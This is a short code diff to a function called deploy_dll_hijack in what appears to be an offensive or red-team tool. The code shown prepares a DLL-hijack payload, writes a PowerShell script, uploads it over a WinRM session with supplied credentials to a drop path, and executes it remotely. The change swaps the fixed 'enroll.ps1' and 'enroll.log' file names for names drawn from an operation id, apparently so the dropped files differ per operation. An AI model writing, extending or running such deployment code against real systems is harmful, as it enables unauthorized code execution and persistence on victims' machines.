@@ -205,7 +205,7 @@ def deploy_dll_hijack(
             print_warning(warning)
         print_info(
             f"enroll will execute as task user {run_as} when the task runs — "
-            f"do not run enroll.ps1 manually over WinRM as {cred.username}"
+            f"do not run the enrollment script manually over WinRM as {cred.username}"
         )
 
     build = prepare_hijack_payload(
@@ -264,13 +264,13 @@ def deploy_dll_hijack(
                 run_as_user=run_as,
                 drop_path=drop_path,
             )
-            enroll_remote = f"{drop_path.rstrip('\\')}\\enroll.ps1"
-            enroll_local = ws_path / "certs" / "enroll.ps1"
+            enroll_remote = f"{drop_path.rstrip('\\')}\\{op.get('id', 'enroll')}.ps1"
+            enroll_local = ws_path / "certs" / f"{op.get('id', 'enroll')}.ps1"
             enroll_local.parent.mkdir(parents=True, exist_ok=True)
             enroll_local.write_text(ps + "\n", encoding="utf-8")
             upload_file(client, enroll_local, enroll_remote, http_fetch_host=fetch_host)
-            print_success(f"uploaded enroll.ps1 → {enroll_remote}")
-            log_remote = f"{drop_path.rstrip('\\')}\\enroll.log"
+            print_success(f"uploaded enrollment script → {enroll_remote}")
+            log_remote = f"{drop_path.rstrip('\\')}\\{op.get('id', 'enroll')}.log"
             safe_marker = enroll_marker.replace("'", "''")
             safe_log = log_remote.replace("'", "''")
             client.execute(
